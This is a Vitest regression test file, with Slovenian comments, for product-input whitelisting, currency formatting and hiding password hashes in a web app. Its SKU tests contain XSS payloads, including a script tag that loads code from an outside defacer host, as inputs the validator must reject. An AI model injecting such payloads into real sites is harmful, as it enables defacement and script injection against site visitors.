// ============================================================
// #104 + #106 + #108 — HARDENING / BUG (regresijska varovala)
// #104: staff statistika ne kliče client hooka s strežnika.
// #106: strežniška bela lista produktov (mass-assignment, XSS v SKU).
// #108: RSC payload uporabnikov brez bcrypt hash/reset žetona.
// ============================================================

import { readFileSync } from "node:fs"
import { describe, expect, it } from "vitest"

import { parseProductServerInput } from "../src/lib/products/server-schema"

const read = (p: string) =>
  readFileSync(__dirname + "/../" + p, "utf8").replace(/\r\n/g, "\n")

describe("#104 — staff statistika: brez client hooka na strežniku", () => {
  it("StaffStatsCards uporablja čist formatCurrency, ne odjemalskega modula currency", () => {
    const card = read("src/components/staff/staff-stats-cards.tsx")
    expect(card).toContain('from "@/lib/utils/format"')
    expect(card).not.toContain('from "@/lib/currency"')
    expect(card).toContain("formatCurrency(amount, currency)")
  })

  it("staff-portal podaja valuto najemnika (SalonConfig.currency)", () => {
    const page = read("src/app/(staff)/staff-portal/page.tsx")
    expect(page).toContain("salonConfig.findUnique")
    expect(page).toContain("select: { currency: true }")
  })
})

describe("#106 — strežniška bela lista produktov", () => {
  const valid = {
    name: "Anti-Aging Serum",
    price: 65,
    sku: "SRM-001",
    vatRate: 22,
  }

  it("veljaven create payload gre skozi z belo listo polj", () => {
    const parsed = parseProductServerInput(
      { ...valid, description: "Serum", unknownKey: "x" },
      "create"
    )
    expect(parsed.ok).toBe(true)
    if (!parsed.ok) return
    // mass-assignment: tuj ključ strukturno izgine
    expect("unknownKey" in parsed.data).toBe(false)
    expect("presetSeed" in parsed.data).toBe(false)
    expect("organizationId" in parsed.data).toBe(false)
    expect("isActive" in parsed.data).toBe(false) // ni poslan → ni v podatkih
  })

  it("XSS payload v sku je zavrnjen (znakovni nabor)", () => {
    const parsed = parseProductServerInput(
      { ...valid, sku: '<script src="https://jso.defacer.id/raw/raxor404"></script>' },
      "create"
    )
    expect(parsed.ok).toBe(false)
    if (parsed.ok) return
    expect(parsed.error).toContain("sku")
  })

  it("predelejko ime (>200) zavrnjeno; obvezna cena manjka pri create", () => {
    expect(
      parseProductServerInput({ ...valid, name: "x".repeat(201) }, "create").ok
    ).toBe(false)
    expect(parseProductServerInput({ name: "Brez cene" }, "create").ok).toBe(false)
  })

  it("update: delna bela lista (vse polja neobvezna), isti prepovedani znaki", () => {
    const parsed = parseProductServerInput({ price: 10 }, "update")
    expect(parsed.ok).toBe(true)
    expect(
      parseProductServerInput({ sku: "<img src=x onerror=1>" }, "update").ok
    ).toBe(false)
  })

  it("actions: parse gre v createProduct IN updateProduct (brez surovega spread raw podatkov)", () => {
    const actions = read("src/app/actions/products.ts")
    expect(actions).toContain("parseProductServerInput(data, \"create\")")
    expect(actions).toContain("parseProductServerInput(data, \"update\")")
    // po parsanju se v Prismo poda parsed.data (bela lista)
    expect(actions).toContain("const { categoryId, ...productData } = parsed.data")
  })
})

describe("#108 — RSC payload brez hash gesel", () => {
  it("getAdminUsers + getUserById omit-irata password in resetToken", () => {
    const users = read("src/app/actions/users.ts")
    expect(users).toContain("omit: { password: true, resetToken: true }")
  })

  it("shema: User ima password in resetToken (obe polji sta pošiljanju vzklik izvzeti)", () => {
    const schema = read("prisma/schema.prisma")
    const block = schema.slice(
      schema.indexOf("model User "),
      schema.indexOf("}", schema.indexOf("model User "))
    )
    expect(block).toContain("password")
    expect(block).toContain("resetToken")
  })
})
